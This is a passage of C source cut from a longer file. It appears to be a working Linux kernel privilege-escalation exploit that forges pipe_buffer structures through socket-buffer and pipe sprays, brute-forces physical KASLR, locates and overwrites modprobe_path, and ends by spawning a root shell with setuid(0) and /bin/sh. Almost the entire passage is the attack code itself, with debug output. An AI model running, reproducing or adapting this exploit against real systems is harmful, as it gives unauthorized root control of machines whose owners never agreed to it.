    if (!pipebuf) { LOG_ERR("calloc(pipebuf)"); return -1; }
    DBG("calloc pipebuf (size=1024) => %p", pipebuf);
    puts("[*] read pipe_buffer with skbuf");
    for (int i = 0; i < SKBUF_SPRAY; i++)
    {
        if (read(sock[i][1], leak, 1024 - 320) < 0)
        {
            LOG_ERR("read(socket)");
            return -1;
        }
        if (*(uint64_t *)&leak[48] != 0x1337133713371337)
        {
            memcpy(pipebuf, leak, 1024);
            puts("[+] found pipe_buffer");
            DBG("pipe_buffer leaked, dumping first 128 bytes");
            HEX_DUMP(pipebuf, 128);
        }
    }

    uint64_t vmemmap_base = pipebuf->page & MASK;
    printf("[*] vmemmap_base: 0x%lx\n", vmemmap_base);
    DBG("vmemmap_base computed=0x%lx", vmemmap_base);

    // Bruteforce phys-KASLR
    uint64_t kernel_base;
    bool found = false;
    uint8_t data[PAGE_SIZE] = {0};
    puts("[*] bruteforce phys-KASLR");
    for (uint64_t i = 0;; i++)
    {
        kernel_base = 0x40 * ((PHYSICAL_ALIGN * i) >> PAGE_SHIFT);
        pipebuf->page = vmemmap_base + kernel_base;
        pipebuf->offset = 0;
        pipebuf->len = PAGE_SIZE + 1;

        printf("\r[*] trying 0x%lx", pipebuf->page);

        for (int i = 0; i < SKBUF_SPRAY; i++)
        {
            if (write(sock[i][0], pipebuf, 1024 - 320) < 0)
            {
                LOG_ERR("write(socket)");
                return -1;
            }
        }

        if (!(i % 100)) { DBG("phys-KASLR iteration %lu, trying page=0x%lx", i, pipebuf->page); }

        for (int j = 0; j < PIPE_SPRAY; j++)
        {
            memset(&data, 0, PAGE_SIZE);
            int count;
            if (count = read(pfd[j][0], &data, PAGE_SIZE) < 0)
            {
                continue;
            }

            if (!memcmp(&data, "pwn", 3))
            {
                continue;
            }

            if (is_kernel_base(data))
            {
                DBG("kernel base signature detected, dumping page sample");
                HEX_DUMP(data, 128);
                found = true;
                break;
            }
        }

        for (int i = 0; i < SKBUF_SPRAY; i++)
        {
            if (read(sock[i][1], leak, 1024 - 320) < 0)
            {
                LOG_ERR("read(socket)");
                return -1;
            }
        }

        if (found)
        {
            DBG("phys-KASLR brute success after %lu iterations: kernel_base_offset=0x%lx", i, kernel_base);
            break;
        }
    }
    found = false;
    printf("\n[+] kernel base vmemmap offset: 0x%lx\n", kernel_base);

    // Scan kernel memory
    uint64_t modprobe_page, modprobe_off;
    uint32_t pipe_idx;
    uint64_t base_off = 0;
    puts("[*] scanning kernel memory");
    for (uint64_t i = 0;; i++)
    {
        pipebuf->page = vmemmap_base + kernel_base + 0x40 * i;
        pipebuf->offset = 0;
        pipebuf->len = PAGE_SIZE + 1;

        if (!(i % 1000))
        {
            printf("\r[*] trying 0x%lx, %iMb", pipebuf->page, i * 4096 / 1024 / 1024);
        }
        for (int i = 0; i < SKBUF_SPRAY; i++)
        {
            if (write(sock[i][0], pipebuf, 1024 - 320) < 0)
            {
                LOG_ERR("write(socket)");
                return -1;
            }
        }

        for (int j = 0; j < PIPE_SPRAY; j++)
        {
            memset(&data, 0, PAGE_SIZE);
            int count;
            if (count = read(pfd[j][0], &data, PAGE_SIZE) < 0)
            {
                continue;
            }

            if (!memcmp(&data, "pwn", 3))
            {
                continue;
            }

            void *locate = (uint64_t *)memmem(&data, PAGE_SIZE, "/sbin/modprobe", sizeof("/sbin/modprobe"));
            if (locate)
            {
                DBG("/sbin/modprobe string located within scanned page, dumping 64 bytes around it");
                size_t offset_ctx = ((uint8_t *)locate - data);
                size_t start_ctx = offset_ctx > 32 ? offset_ctx - 32 : 0;
                HEX_DUMP(((uint8_t *)data) + start_ctx, 64);
                puts("\n[+] found modprobe_path");
                modprobe_page = pipebuf->page;
                modprobe_off = (uint8_t *)locate - data;
                printf("[*] modprobe page: 0x%lx\n", modprobe_page);
                printf("[*] modprobe offset: 0x%lx\n", modprobe_off);
                found = true;
                pipe_idx = j;
                break;
            }
        }

        for (int i = 0; i < SKBUF_SPRAY; i++)
        {
            if (read(sock[i][1], leak, 1024 - 320) < 0)
            {
                LOG_ERR("read(socket)");
                return -1;
            }
        }

        if (found)
        {
            DBG("modprobe_path located at page=0x%lx offset=0x%lx using pipe_idx=%u", modprobe_page, modprobe_off, pipe_idx);
            break;
        }
    }

    char fd_path[32] = {0};
    puts("[*] overwrite modprobe_path");
    for (int i = 0; i < 4194304; i++)
    {
        pipebuf->page = modprobe_page;
        pipebuf->offset = modprobe_off;
        pipebuf->len = 0;
        for (int i = 0; i < SKBUF_SPRAY; i++)
        {
            if (write(sock[i][0], pipebuf, 1024 - 320) < 0)
            {
                LOG_ERR("write(socket)");
                break;
            }
        }

        memset(&data, 0, PAGE_SIZE);
        snprintf(fd_path, sizeof(fd_path), "/proc/%i/fd/%i", i, modprobe_fd);

        lseek(modprobe_fd, 0, SEEK_SET);
        dprintf(modprobe_fd, MODPROBE_SCRIPT, i, status_fd, i, stdin_fd, i, stdout_fd);

        if (write(pfd[pipe_idx][1], fd_path, 32) < 0)
        {
            LOG_ERR("write(pipe)");
        }

        if (check_modprobe(fd_path))
        {
            puts("[-] failed to overwrite modprobe");
            break;
        }

        if (trigger_modprobe(status_fd))
        {
            puts("\n[+] got root");
            DBG("trigger_modprobe succeeded, root shell spawned");
            /* Spawn an interactive root shell on the current TTY so the
             * exploit stops here with a usable root shell instead of just
             * sleeping forever.  We try execlp first; if that fails we keep
             * the old behaviour. */
            setuid(0);
            setgid(0);
            execl("/bin/sh", "sh", NULL);
            perror("execl(/bin/sh)");
            goto out;
        }

        for (int i = 0; i < SKBUF_SPRAY; i++)
        {
            if (read(sock[i][1], leak, 1024 - 320) < 0)
            {
                LOG_ERR("read(socket)");
                return -1;
            }
        }
    }
    puts("[-] fake modprobe failed");

out:
    for (int i = 0; i < SKBUF_SPRAY; i++)
    {
        if (read(sock[i][1], leak, 1024 - 320) < 0)
        {
            LOG_ERR("read(socket)");
            return -1;
        }
    }

    // Release slots in kmalloc-256 to avoid dereferencing corrupted freelist
    for (int i = 0; i < SPRAY; i++)
    {
        if (qid[i] == -1)
        {
            continue;
        }
        if (msgrcv(qid[i], msg, 0xe8 - 48, MTYPE_PRIMARY, IPC_NOWAIT) < 0)
        {
            perror("[-] msgrcv");
        }
        if (msgrcv(qid[i], msg, 1024 - 48, MTYPE_SECONDARY, IPC_NOWAIT) < 0)
        {
            perror("[-] msgrcv");
        }
        qid[i] = -1;
    }

    sleep(13371337);
    return 0;
}

int main(int argc, char *argv[])
{
    DBG("main(argc=%d) start", argc);
    fflush(stderr);
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);
    srand(time(NULL));

    if (!fork())
    {
        unshare_setup(getuid(), getgid());
        set_cpu_affinity(0, 0);
        exploit(argc, argv);
    }

    while (1)
        sleep(1);
    return 0;
}
